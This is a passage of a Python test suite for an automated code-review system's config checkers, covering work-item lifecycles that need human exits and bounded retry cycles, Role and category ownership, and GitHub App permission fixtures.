        self.assertTrue(caught(check_lifecycle.check(lc), "only a person takes a Work item out of not_served"))

    def test_only_a_person_or_a_strangers_change_left_to_a_person_leaves_a_person_only_state(self):  # decision 0037
        # An outsider's edit makes an issue's acceptance lapse, from a Hold of the brakes too, and the issue then waits
        # for a person: the issue's Lifecycle declares it, bound by a person, and passes.
        lc = check_lifecycle.load("issue")
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertIn(("held", "new", "stranger", check_lifecycle.PERSON),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        self.assertEqual(check_lifecycle.check(lc, limits), [])
        # No one else leaves it: neither the platform nor a Lens.
        for by in ("platform", "lens"):
            tr = {"from": "held", "to": "new", "by": by, "bound": check_lifecycle.PERSON}
            problems = check_lifecycle.check(dict(lc, transitions=lc["transitions"] + [tr]), limits)
            self.assertTrue(caught(problems, "held is left by %s; only a person takes a Work item out of held" % by),
                            problems)
        # And a stranger's change names the bound person, out of a person-only State or any other.
        for start in ("held", "triage"):
            for bound in (None, "max_attempts"):
                transitions = [dict(tr, bound=bound) if (tr["from"], tr["by"]) == (start, "stranger") else tr
                               for tr in lc["transitions"]]
                problems = check_lifecycle.check(dict(lc, transitions=transitions), limits)
                self.assertTrue(caught(problems, "%s -> new by stranger names the bound %s; what a stranger starts"
                                                 " only a person ends" % (start, bound)), problems)

    def test_an_undeclared_person_only_state_is_caught(self):
        lc = dict(check_lifecycle.load(), person_only_exits=["limbo"])
        problems = check_lifecycle.check(lc)
        self.assertTrue(caught(problems, "person_only_exits names an undeclared state: limbo"), problems)

    def test_malformed_lifecycle_data_is_reported_not_raised(self):
        pr = check_lifecycle.load()
        pr["transitions"][0].pop("by")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": "[]", "lifecycle/pull_request.json": json.dumps(pr)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json does not match the Lifecycle schema"), problems)
        self.assertTrue(caught(problems, "lifecycle/pull_request.json does not match the Lifecycle schema"), problems)
        self.assertTrue(check_lifecycle.check({"states": "x"}))
        self.assertTrue(caught(check_lifecycle.run(clone({"config/defaults.json": "[]"})), "config/defaults.json"))
        self.assertTrue(caught(check_lifecycle.run(clone({"schemas/lifecycle.schema.json": "[]"})),
                               "schemas/lifecycle.schema.json"))

    def test_a_state_nothing_declares_or_reaches_or_times_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["states"].append("limbo")
        lc["transitions"].append({"from": "merged", "to": "nowhere", "by": "human", "bound": None})
        problems = check_lifecycle.check(lc)
        for words in ("state can never be reached: limbo", "no staleness limit for: limbo",
                      "a terminal state has a way out: merged", "an undeclared state: nowhere"):
            self.assertTrue(caught(problems, words), words)

    def test_an_issue_retried_with_no_bound_is_caught(self):
        # I-14. The cycle that failed the issue Lifecycle's first drawing: `ready` to `in_progress`
        # and back, when an opening Run ends having opened nothing.
        lc = check_lifecycle.load("issue")
        self.assertEqual(check_lifecycle.check(lc), [])
        self.assertIn(("in_progress", "ready", "factory", "max_attempts"),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        self.assertIn("a cycle with no person in it has no bound: ready -> in_progress -> ready",
                      check_lifecycle.check(unbound(lc, "max_attempts")))

    def test_an_issue_retried_after_every_unmerged_close_is_caught(self):
        # I-43. `in_progress` or `in_review` back to `ready`, when a linked pull request closes unmerged.
        lc = check_lifecycle.load("issue")
        self.assertTrue(caught(check_lifecycle.check(unbound(lc, "max_unmerged_closes")),
                               "a cycle with no person in it has no bound"))

    def test_verify_checks_the_issue_lifecycle_too(self):
        lc = unbound(check_lifecycle.load("issue"), "max_attempts")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: a cycle with no person in it"), problems)
        self.assertFalse(caught(problems, "lifecycle/pull_request.json"), problems)

    def test_a_work_item_with_no_lifecycle_is_caught(self):
        root = clone({"lifecycle/issues.json": (ROOT / "lifecycle" / "issue.json").read_text()})
        (root / "lifecycle" / "issue.json").unlink()
        problems = check_lifecycle.run(root)
        self.assertTrue(caught(problems, "no Lifecycle for the Work item issue"), problems)
        self.assertTrue(caught(problems, "lifecycle/issues.json declares the Work item issue"), problems)

    def test_a_bound_that_is_not_a_limit_is_caught(self):
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        del config["limits"]["max_unmerged_closes"]
        problems = check_lifecycle.run(clone({"config/defaults.json": json.dumps(config)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: the bound max_unmerged_closes is not a limit"),
                        problems)

    def test_the_act_ceiling_can_bound_a_transition(self):
        # An enqueue is an act, not a Run; a cycle through the merge queue is bounded by the act ceiling.
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) == ("converged", "queued"):
                tr["bound"] = "max_acts_per_item"
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(check_lifecycle.check(lc, config["limits"]), [])
        del config["limits"]["max_acts_per_item"]
        self.assertTrue(caught(check_lifecycle.check(lc, config["limits"]), "the bound max_acts_per_item is not a limit"))

    def test_a_cycle_through_a_lens_with_no_bound_is_caught(self):
        # L-04 and I-14 hold for any cycle with no person in it, not only one the Factory makes alone.
        # A Lens that flipped `converged` and `addressing` on unchanged content would go round for ever.
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertEqual(check_lifecycle.check(check_lifecycle.load(), limits), [])
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) == ("addressing", "converged"):
                tr["by"] = "lens"
        self.assertIn("a cycle with no person in it has no bound: addressing -> converged -> addressing",
                      check_lifecycle.check(lc, limits))

    def test_a_cycle_through_the_platform_with_no_bound_is_caught(self):
        # A merge queue that ejects every time, and an enqueue made again each time it does.
        lc = check_lifecycle.load()
        lc["transitions"] = [dict(tr, bound=None) if (tr["from"], tr["to"]) == ("converged", "queued") else tr
                             for tr in lc["transitions"]]
        problems = check_lifecycle.check(lc)
        self.assertTrue(any(p.startswith("a cycle with no person in it has no bound: ") and "converged -> queued" in p
                            for p in problems), problems)
        problems = check_lifecycle.run(clone({"lifecycle/pull_request.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/pull_request.json: a cycle with no person in it"), problems)

    def test_a_hold_only_a_person_ends_is_bound_by_a_person_and_nothing_else_is(self):
        # A Hold an App places has no ceiling behind it, and stands until a person removes it.
        lc = check_lifecycle.load()
        self.assertIn(("verifying", "held", "platform", check_lifecycle.PERSON),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertEqual(check_lifecycle.check(lc, limits), [])
        for tr in ({"from": "verifying", "to": "addressing", "by": "lens", "bound": check_lifecycle.PERSON},
                   {"from": "verifying", "to": "held", "by": "human", "bound": check_lifecycle.PERSON}):
            problems = check_lifecycle.check(dict(lc, transitions=lc["transitions"] + [tr]), limits)
            self.assertTrue(caught(problems, "the bound person is only for a Hold that no person makes"), tr)
        # Without it, the platform's way out of a Hold on the content closes a cycle with no person in it.
        self.assertTrue(caught(check_lifecycle.check(unbound(lc, check_lifecycle.PERSON)),
                               "a cycle with no person in it has no bound"))

    def test_a_bound_the_kernel_does_not_count_for_each_item_is_caught(self):
        # A limit on size or on the whole org stops nothing going round on one item.
        for limit in ("max_diff_lines", "org_max_active_runs"):
            lc = check_lifecycle.load()
            for tr in lc["transitions"]:
                if (tr["from"], tr["to"]) == ("converged", "queued"):
                    tr["bound"] = limit
            words = "the bound %s is not a limit the Kernel counts for each item" % limit
            self.assertTrue(caught(check_lifecycle.check(lc), words), limit)
            problems = check_lifecycle.run(clone({"lifecycle/pull_request.json": json.dumps(lc)}))
            self.assertTrue(caught(problems, "lifecycle/pull_request.json: " + words), problems)

    def test_a_pull_request_not_served_can_be_served_again_but_not_by_a_loop(self):
        # A stacked pull request is not served until GitHub retargets it, so `not_served` is not terminal.
        lc = check_lifecycle.load()
        self.assertNotIn("not_served", lc["terminal"])
        self.assertEqual(lc["stale_after_minutes"]["not_served"], 1440)
        exits = {(tr["to"], tr["by"]) for tr in lc["transitions"] if tr["from"] == "not_served"}
        self.assertLessEqual({("verifying", "platform"), ("draft", "platform"), ("closed", "human")}, exits)
        self.assertEqual(check_lifecycle.check(lc), [])
        lc["transitions"].append({"from": "verifying", "to": "not_served", "by": "platform", "bound": None})
        self.assertIn("a cycle with no person in it has no bound: verifying -> not_served -> verifying",
                      check_lifecycle.check(lc))


class Authority(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "authority.json").read_text())

    def test_security_may_never_be_declined(self):
        self.table["categories"]["security"]["may_accept"].append("declined")
        self.assertTrue(caught(check_authority.run(self.table), "security"))

    def test_the_author_may_not_own_a_category(self):
        self.table["categories"]["functional"]["owner"] = "dev-lead"
        self.assertTrue(caught(check_authority.run(self.table), "author Role"))

    def test_a_value_held_twice_must_agree(self):
        self.table["max_rounds"] = 9
        self.assertTrue(caught(check_authority.run(self.table), "max_rounds differs"))

    def test_a_category_nobody_owns_is_caught(self):
        del self.table["categories"]["human"]
        self.table["categories"]["performance"] = {"owner": "pr-review", "may_accept": ["fixed"]}
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "category human, and nobody owns it"))
        self.assertTrue(caught(problems, "performance has an owner, and no Finding can carry it"))

    def test_a_thread_carries_the_categories_a_finding_does(self):
        facts = json.loads((ROOT / "schemas" / "facts.schema.json").read_text())
        enum = facts["properties"]["threads"]["items"]["properties"]["category"]["enum"]
        enum.remove("security")
        enum.append("style")
        problems = check_authority.run(self.table, facts=facts)
        self.assertTrue(caught(problems, "a thread may carry the category style, and no Finding can"))
        self.assertTrue(caught(problems, "a Finding may carry the category security, and no thread can"))
        # A schema with no category on a thread is a problem reported, not one raised.
        del facts["properties"]["threads"]["items"]["properties"]["category"]
        self.assertTrue(caught(check_authority.run(self.table, facts=facts), "a thread in the facts carries no category"))

    def team(self, roles=None, apps=None):
        """The team checks alone, on the manifests given, or the repo's."""
        from tools.check_examples import LIVE
        roles = check_authority.manifests() if roles is None else roles
        apps = json.loads((ROOT / "config" / "apps.json").read_text()) if apps is None else apps
        return check_authority.team(roles, self.table, apps, LIVE)

    def review(self, **over) -> dict:
        m = json.loads((ROOT / "roles" / "pr-review.json").read_text())
        m.update(over)
        return m

    def test_the_repos_roles_hold_to_the_team_checks(self):  # issue 194, ruling 8
        self.assertEqual(self.team(), [])
        self.assertEqual(sorted(check_authority.manifests()), ["pr-review"])
        # The check the verify step runs reads the team too.
        self.assertTrue(caught(check_authority.run(self.table, roles={"pr-review": self.review(name="another-role")}),
                               "roles/pr-review.json names the Role 'another-role'"))

    def test_a_manifest_is_named_as_its_file_and_held_to_role_1(self):  # decision 0039
        problems = self.team({"pr-review": self.review(name="dev-lead"), "qa-lead": self.review(name="qa-lead",
                                                                                                kind="shadow")})
        self.assertTrue(caught(problems, "roles/pr-review.json names the Role 'dev-lead'"))
        self.assertTrue(caught(problems, "roles/qa-lead.json is held to no schema; add it to LIVE"))
        # Held to role/1 itself: LIVE names its schema, and the manifest says it (Muse's read).
        from tools.check_examples import LIVE
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        self.assertTrue(caught(check_authority.team({"pr-review": self.review()}, self.table, apps,
                                                    dict(LIVE, **{"roles/pr-review.json": "authority"})),
                               "roles/pr-review.json is held to no schema"))
        # A manifest of another shape is a problem, never a traceback, and nothing else is read from it (issue 330).
        for over in ({"schema": "role/999"}, {"owns": "security"}, {"intents": {}}, {"name": 7}, {"app": ["x"]},
                     {"intents": [dict(self.review()["intents"][0], evals=None)]},
                     {"intents": [dict(self.review()["intents"][0], permitted_effects="submit_review")]}):
            problems = check_authority.team({"pr-review": self.review(**over)}, self.table, apps, LIVE)
            self.assertTrue(caught(problems, "roles/pr-review.json does not hold to role/1"), over)
            self.assertTrue(caught(problems, "functional's owner pr-review has no manifest in roles/"), over)

    def test_an_owner_owns_what_the_authority_table_names_and_each_category_has_one(self):  # section 5.4
        fewer = self.review(owns=self.review()["owns"][1:])
        self.assertTrue(caught(self.team({"pr-review": fewer}), "pr-review owns"))
        self.assertTrue(caught(self.team({"pr-review": self.review(kind="reviewer")}),
                               "only an owner owns a category"))
        # The table's owner is an owner, owning what it names, whatever its manifest says (Argon's read).
        quiet = self.team({"pr-review": self.review(kind="reviewer", owns=[])})
        self.assertTrue(caught(quiet, "pr-review is named the owner of"))
        self.assertTrue(caught(quiet, "pr-review owns [], and the authority table names it the owner of"))
        self.assertTrue(caught(self.team({}), "functional's owner pr-review has no manifest in roles/"))
        twin = self.review(name="pr-review-two", app="combsmith-sf-other", owns=["security"])
        self.assertTrue(caught(self.team({"pr-review": self.review(), "pr-review-two": twin}),
                               "security is owned by ['pr-review', 'pr-review-two']"))

    def test_each_permitted_effect_is_within_the_ceiling_of_its_roles_own_app(self):  # section 5.4, decision 0005
        wide = self.review(intents=[dict(self.review()["intents"][0], permitted_effects=["submit_review",
                                                                                         "create_check_run"])])
        waiting = json.loads((ROOT / "config" / "apps.json").read_text())
        waiting["needs"]["effect:create_check_run"] = {"waits_on": "the grant"}
        waiting["apps"]["pr-review"]["permissions"]["checks"]["needs"].remove("effect:create_check_run")
        self.assertTrue(caught(self.team({"pr-review": wide}, waiting),
                               "pr-review permits create_check_run, beyond the ceiling"))
        self.assertTrue(caught(self.team({"pr-review": self.review(app="combsmith-sf-nobody")}),
                               "names no App of config/apps.json"))
        # An App named is one that exists, whether or not the Role writes yet (Argon's read).
        silent = self.review(intents=[dict(self.review()["intents"][0], permitted_effects=[])],
                             app="combsmith-sf-nobody")
        self.assertTrue(caught(self.team({"pr-review": silent}), "names no App of config/apps.json"))
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        apps["apps"]["pr-review"]["permissions"]["pull_requests"]["needs"].remove("effect:submit_review")
        self.assertTrue(caught(self.team(apps=apps), "pr-review permits submit_review, beyond the ceiling"))
        # A need listed under a grant below its level is beyond the ceiling (Muse's read).
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        apps["apps"]["pr-review"]["permissions"]["pull_requests"]["level"] = "read"
        self.assertTrue(caught(self.team(apps=apps), "pr-review permits submit_review, beyond the ceiling"))
        # Granted and mapped, as config/apps.json has it since 2026-10-27, it is within the ceiling.
        self.assertEqual(self.team({"pr-review": wide}), [])

    def test_an_intent_of_class_gate_names_an_eval_set_of_its_own(self):  # section 5.4
        for evals in ("evals/nothing-here", "evals/context"):
            gate = self.review(intents=[dict(self.review()["intents"][0], evals=evals)])
            self.assertTrue(caught(self.team({"pr-review": gate}), "names no eval set of its own"), evals)
        other = self.review(intents=[dict(self.review()["intents"][0], name="adjudicate-findings")])
        self.assertTrue(caught(self.team({"pr-review": other}), "Intent adjudicate-findings spends from gate"))
        # Another Role's set of the same Intent is not this Role's, and a set that cannot be read is none (Argon's
        # and CodeRabbit's reads).
        from tools.check_examples import LIVE
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        with tempfile.TemporaryDirectory() as d:
            (pathlib.Path(d) / "evals" / "theirs").mkdir(parents=True)
            (pathlib.Path(d) / "evals" / "theirs" / "cases.json").write_text(json.dumps(
                {"schema": "eval-set/1", "role": "qa-lead", "intent": "review-change", "count": 0, "cases": []}))
            (pathlib.Path(d) / "evals" / "broken").mkdir()
            (pathlib.Path(d) / "evals" / "broken" / "cases.json").write_text("{not json")
            for evals in ("evals/theirs", "evals/broken"):
                gate = self.review(intents=[dict(self.review()["intents"][0], evals=evals)])
                self.assertTrue(caught(check_authority.team({"pr-review": gate}, self.table, apps, LIVE, pathlib.Path(d)),
                                       "names no eval set of its own"), evals)

    def test_a_shadow_writes_nothing_and_spends_from_shadow(self):  # decision 0039
        shadow = self.review(name="qa-lead", kind="shadow", owns=[], app="combsmith-sf-qa-lead")
        live = {"pr-review": self.review(), "qa-lead": shadow}
        from tools.check_examples import LIVE
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        problems = check_authority.team(live, self.table, apps, dict(LIVE, **{"roles/qa-lead.json": "role"}))
        self.assertTrue(caught(problems, "qa-lead is a shadow, and its Intent review-change writes"))
        # Each half on its own: a shadow that writes, or one that spends from gate (Argon's read).
        for intent in (dict(shadow["intents"][0], budget_class="shadow"),
                       dict(shadow["intents"][0], permitted_effects=[])):
            one = dict(shadow, intents=[intent])
            del one["app"]
            self.assertTrue(caught(check_authority.team({"pr-review": self.review(), "qa-lead": one}, self.table, apps,
                                                        dict(LIVE, **{"roles/qa-lead.json": "role"})), "qa-lead is a shadow"))
        quiet = dict(shadow, intents=[dict(shadow["intents"][0], permitted_effects=[], budget_class="shadow")])
        del quiet["app"]
        self.assertEqual(check_authority.team({"pr-review": self.review(), "qa-lead": quiet}, self.table, apps,
                                              dict(LIVE, **{"roles/qa-lead.json": "role"})), [])

    def test_what_cannot_be_read_is_reported_never_raised(self):  # CodeRabbit's read
        with tempfile.TemporaryDirectory() as d:
            (pathlib.Path(d) / "roles").mkdir()
            (pathlib.Path(d) / "roles" / "broken.json").write_text("{not json")
            read = check_authority.manifests(pathlib.Path(d))
        self.assertEqual(read, {"broken": None})
        self.assertTrue(caught(self.team(dict(read, **{"pr-review": self.review()})),
                               "roles/broken.json cannot be read as a manifest"))
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        del apps["apps"]["pr-review"]["permissions"]
        self.assertTrue(caught(self.team(apps=apps), "pr-review permits submit_review, beyond the ceiling"))

    def test_a_writer_spends_from_gate_and_no_role_is_named_for_no_one(self):  # the Claude review
        # An Intent that writes spends from gate, so it is held to an eval set before it writes.
        off = self.review(intents=[dict(self.review()["intents"][0], budget_class="shadow", evals="evals/nothing")])
        self.assertTrue(caught(self.team({"pr-review": off}), "an Intent that writes spends from gate"))
        # The table reads `human` and `none` as no Role, so no manifest is named either.
        from tools.check_examples import LIVE
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        quiet = {"intents": [dict(self.review()["intents"][0], permitted_effects=[], budget_class="shadow")]}
        for word in ("human", "none"):
            one = self.review(name=word, kind="shadow", owns=[], **quiet)
            del one["app"]
            self.assertTrue(caught(check_authority.team({"pr-review": self.review(), word: one}, self.table, apps,
                                                        dict(LIVE, **{"roles/%s.json" % word: "role"})),
                                   "which the authority table reads as no Role"), word)
        # The Controller's App and the reader's are no Role's.
        for app in ("combsmith-sf-controller", "combsmith-sf-reader"):
            one = self.review(name="dev-lead", kind="author", owns=[], app=app, **quiet)
            self.assertTrue(caught(check_authority.team({"pr-review": self.review(), "dev-lead": one}, self.table, apps,
                                                        dict(LIVE, **{"roles/dev-lead.json": "role"})), "which is no Role's App"), app)

    def test_each_role_writes_through_its_own_app(self):  # L-44
        other = self.review(name="qa-lead", kind="shadow", owns=[],
                            intents=[dict(self.review()["intents"][0], permitted_effects=[], budget_class="shadow")])
        from tools.check_examples import LIVE
        apps = json.loads((ROOT / "config" / "apps.json").read_text())
        problems = check_authority.team({"pr-review": self.review(), "qa-lead": other}, self.table, apps,
                                        dict(LIVE, **{"roles/qa-lead.json": "role"}))
        self.assertTrue(caught(problems, "['pr-review', 'qa-lead'] write through one App, combsmith-sf-pr-review"))

    def test_a_raised_finding_with_a_category_nobody_owns_is_caught(self):  # decision 0038
        result = json.loads((ROOT / "schemas" / "result.schema.json").read_text())
        raised = result["$defs"]["raised"]["properties"]
        raised["category"]["enum"].remove("security")
        raised["category"]["enum"].append("style")
        raised["severity"]["enum"].append("trivial")
        problems = check_authority.run(self.table, result=result)
        self.assertTrue(caught(problems, "a raised Finding may carry the category style, and no Finding record can"))
        self.assertTrue(caught(problems, "a Finding record may carry the category security, and no raised Finding can"))
        self.assertTrue(caught(problems, "a raised Finding may carry the severity trivial, and no Finding record can"))
        del raised["category"]["enum"]
        del raised["severity"]
        problems = check_authority.run(self.table, result=result)
        self.assertTrue(caught(problems, "a raised Finding in a Result carries no category"))
        self.assertTrue(caught(problems, "a raised Finding in a Result carries no severity"))

    def test_a_manifest_with_a_category_nobody_owns_is_caught(self):  # decision 0039
        role = json.loads((ROOT / "schemas" / "role.schema.json").read_text())
        role["properties"]["owns"]["items"]["enum"].append("style")
        role["properties"]["lens"]["properties"]["raises"]["items"]["enum"].remove("security")
        problems = check_authority.run(self.table, role=role)
        self.assertTrue(caught(problems, "a Role manifest may own the category style, and no Finding can carry it"))
        self.assertTrue(caught(problems, "a Finding may carry the category security, and no Role manifest can raise it"))
        del role["properties"]["shadows"]
        self.assertTrue(caught(check_authority.run(self.table, role=role), "a Role manifest's shadows names no category"))

    def test_the_kernel_reads_the_categories_and_severities_a_finding_carries(self):
        for name, value in (("CATEGORIES", terms.CATEGORIES[1:]), ("SEVERITIES", terms.SEVERITIES + ("critical",))):
            with mock.patch.object(terms, name, value):
                self.assertTrue(caught(check_authority.run(self.table), "the Kernel reads the"), name)

    def test_the_status_on_the_item_never_carries_a_required_lens_name(self):
        # The Controller posts the status on the item as a check run under one fixed name. Under a required Lens's
        # name it would speak for that Lens: a deterministic Lens's check, or a model Lens's.
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(check_authority.run(self.table, config), [])
        required = config["required_lenses"]
        names = [lens[key] for lens in required["deterministic"] for key in ("lens", "check")] + required["model"]
        # A Lens's name or its check's, in any case and with any space around it: a reader of names may fold either.
        for name in names + [n.upper() for n in names] + [" %s\t" % n for n in names]:
            problems = check_authority.run(self.table, dict(config, status_on_item=name))
            self.assertTrue(caught(problems, "the status on the item is named %r, a required Lens's" % name), name)

    def test_a_lens_or_a_check_named_twice_is_refused(self):
        # Two entries for one Lens, or for one check, could each pin another App: which one reads the Lens is unclear.
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = config["required_lenses"]["deterministic"]
        for twice in (dict(lenses[0], app_id=1000001), dict(lenses[1], lens=lenses[0]["lens"].upper()),
                      dict(lenses[1], lens="another", check=" %s " % lenses[0]["check"])):
            config["required_lenses"]["deterministic"] = lenses + [twice]
            self.assertTrue(caught(check_authority.run(self.table, config), "is named twice"), twice)
        config["required_lenses"]["deterministic"] = lenses
        # So is a model Lens named twice, or one that shares a deterministic Lens's name.
        model = config["required_lenses"]["model"]
        for twice in (model + [model[0]], model + [" %s" % lenses[0]["lens"].upper()]):
            config["required_lenses"]["model"] = twice
            self.assertTrue(caught(check_authority.run(self.table, config), "is named twice"), twice)
        # The other side: each named once.
        config["required_lenses"]["model"] = model
        self.assertEqual(check_authority.run(self.table, config), [])

    def test_a_category_a_model_judges_needs_a_role_and_no_role_shadows_itself(self):
        self.table["categories"]["functional"]["owner"] = "human"
        self.table["categories"]["security"]["shadow"] = "pr-review"
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "needs a Role as owner") and caught(problems, "cannot shadow itself"))


class Apps(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "apps.json").read_text())
        self.apps, self.needs = self.table["apps"], self.table["needs"]
        self.fixture = json.loads((ROOT / "trials" / "P-39.grants.json").read_text())
        self.reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        installations = [e for e in self.fixture["exchanges"] if e["request"]["call"] == check_apps.INSTALLATIONS]
        self.listed = installations[0]["response"]["body"]["installations"]
        self.installed = {i["app_slug"]: i for i in self.listed}
        self.registered = {e["response"]["body"]["slug"]: e["response"]["body"] for e in self.fixture["exchanges"]
                           if e["request"]["call"].startswith(check_apps.REGISTRATION)}
        self.reached = {e["request"]["as"]["name"]: e["response"]["body"] for e in self.reach["exchanges"]}

    def check(self, **leave_out) -> list:
        facts = (ROOT / "schemas" / "facts.schema.json").read_text()
        files = {"config/apps.json": json.dumps(self.table), "schemas/facts.schema.json": facts,
                 "trials/P-39.grants.json": json.dumps(self.fixture), "trials/P-39.reach.json": json.dumps(self.reach)}
        return check_apps.run(tree({rel: text for rel, text in files.items() if rel not in leave_out.get("files", ())}))

    def test_the_data_is_held_to_what_github_granted_each_app(self):
        # P-39 recorded each installation's permissions. The data must name exactly those, at the same levels: a
        # permission GitHub granted that the data leaves out, one the data names that was not granted, and a level
        # that differs are each caught, and so is an app_id whose installation is another App's, or none.
        self.assertEqual(self.check(), [])
        self.installed["combsmith-sf-controller"]["permissions"]["deployments"] = "read"
        self.installed["combsmith-sf-reader"]["permissions"].pop("checks")
        self.apps["pr-review"]["permissions"]["contents"]["level"] = "write"
        problems = self.check()
        self.assertTrue(caught(problems, "controller: deployments is absent in the data and read as GitHub granted it"))
        self.assertTrue(caught(problems, "reader: checks is read in the data and absent as GitHub granted it"))
        self.assertTrue(caught(problems, "pr-review: contents is write in the data and read as GitHub granted it"))
        self.setUp()
        self.apps["controller"]["app_id"] = self.apps["reader"]["app_id"]
        self.apps["reader"]["app_id"] = 1
        problems = self.check()
        self.assertTrue(caught(problems, "controller: App 5364151 is installed as combsmith-sf-reader"))
        self.assertTrue(caught(problems, "reader: trials/P-39.grants.json records no installation of App 1"))

    def test_an_installation_with_events_or_on_every_repo_is_caught(self):
        # Decision 0035: P-39 passes only if each installation receives no event and is on selected repos.
        self.installed["combsmith-sf-controller"]["events"] = ["push"]
        self.installed["combsmith-sf-reader"]["repository_selection"] = "all"
        problems = self.check()
        self.assertTrue(caught(problems, "controller: its installation in trials/P-39.grants.json receives the "
                                         "events ['push']"))
        self.assertTrue(caught(problems, "reader: its installation in trials/P-39.grants.json has the selection all"))
        self.assertFalse(caught(problems, "pr-review:"))

    def test_the_registration_is_held_to_the_data_as_the_installation_is(self):
        # What the App is registered with is what a new installation accepts, so it too is held to the data.
        self.registered["combsmith-sf-controller"]["permissions"]["contents"] = "write"
        self.registered["combsmith-sf-reader"]["events"] = ["pull_request"]
        self.registered["combsmith-sf-pr-review"]["id"] = 1
        problems = self.check()
        self.assertTrue(caught(problems, "controller: contents is read in the data and write as the App is "
                                         "registered in trials/P-39.grants.json"))
        self.assertTrue(caught(problems, "reader: the App is registered in trials/P-39.grants.json for the events "
                                         "['pull_request']"))
        self.assertTrue(caught(problems, "pr-review: combsmith-sf-pr-review is registered as App 1"))
        self.setUp()
        self.fixture["exchanges"] = [e for e in self.fixture["exchanges"]
                                     if e["request"]["call"] != "GET /apps/combsmith-sf-reader"]
        problems = self.check()
        self.assertTrue(caught(problems, "reader: no fixture of trial P-39 records GET /apps/combsmith-sf-reader"))
        self.assertFalse(caught(problems, "controller: no fixture"))

    def test_a_fixture_of_p39_that_failed_is_not_trusted(self):
        # Only a passing fixture is kept, and no App's key is stored until P-39 passes.
        self.fixture["verdict"] = "fail"
        self.reach["verdict"] = "fail"
        problems = self.check()
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its verdict is fail"))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: its verdict is fail"))

    def test_the_repos_each_installation_reaches_are_exactly_installed_on(self):
        # P-39's reach fixture is held to installed_on, and without it which repos an App reaches is unread.
        self.reached["combsmith-sf-controller"]["repository_selection"] = "all"
        self.reached["combsmith-sf-controller"]["repositories"] = []
        self.reached["combsmith-sf-controller"]["total_count"] = 0
        self.apps["reader"]["installed_on"] = self.apps["reader"]["installed_on"][:1]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: its installation reaches repos by the selection all in "
                                         "trials/P-39.reach.json"))
        self.assertTrue(caught(problems, "controller: its installation reaches no repo in trials/P-39.reach.json"))
        self.assertTrue(caught(problems, "reader: its installation reaches combsmith/software-factory, combsmith/%s in "
                                         "trials/P-39.reach.json, and installed_on names combsmith/software-factory;"
                                         % check_trials.CANARY))
        self.setUp()
        problems = self.check(files=("trials/P-39.reach.json",))
        for app in ("controller", "pr-review", "reader"):
            self.assertTrue(caught(problems, "%s: no fixture of trial P-39 records GET /installation/repositories read "
                                             "as combsmith-sf-%s" % (app, app)))

    def test_a_read_github_refused_is_not_trusted(self):
        # A read answered with anything but 200 holds nothing GitHub granted, even when its body matches the data.
        exchange = [e for e in self.fixture["exchanges"] if e["request"]["call"] == check_apps.INSTALLATIONS][0]
        exchange["response"]["status"] = 403
        self.reach["exchanges"][0]["response"]["status"] = 401
        problems = self.check()
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its read GET /orgs/combsmith/installations was "
                                         "answered 403, not 200"))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: its read GET /installation/repositories?per_page=100 "
                                         "was answered 401, not 200"))
        self.assertTrue(caught(problems, "controller: no fixture of trial P-39 records GET /installation/repositories"))

    def test_an_app_listed_twice_among_the_installations_is_caught(self):
        # A record that lists one App twice cannot be trusted, whichever copy agrees with the data.
        twin = json.loads(json.dumps(self.installed["combsmith-sf-controller"]))
        twin["permissions"]["contents"] = "write"
        self.listed.insert(0, twin)
        self.fixture["exchanges"][3]["response"]["body"]["total_count"] += 1
        problems = self.check()
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its read GET /orgs/combsmith/installations lists "
                                         "App 5364130 more than once"))
        self.assertTrue(caught(problems, "no fixture of trial P-39 in trials/ records GET /orgs/combsmith/installations"))

    def test_a_list_not_read_whole_is_not_trusted(self):
        # One page of more, a count the list falls short of, or one repo listed twice, is not the whole of what an
        # installation reaches, nor of the org's installations.
        self.reach["exchanges"][0]["response"]["headers"]["link"] = '<https://api.github.com/x?page=2>; rel="next"'
        self.reached["combsmith-sf-pr-review"]["total_count"] = 3
        repos = self.reached["combsmith-sf-reader"]["repositories"]
        repos[1] = json.loads(json.dumps(repos[0]))
        self.fixture["exchanges"][3]["response"]["body"]["total_count"] = 19
        problems = self.check()
        call = "its read GET /installation/repositories?per_page=100"
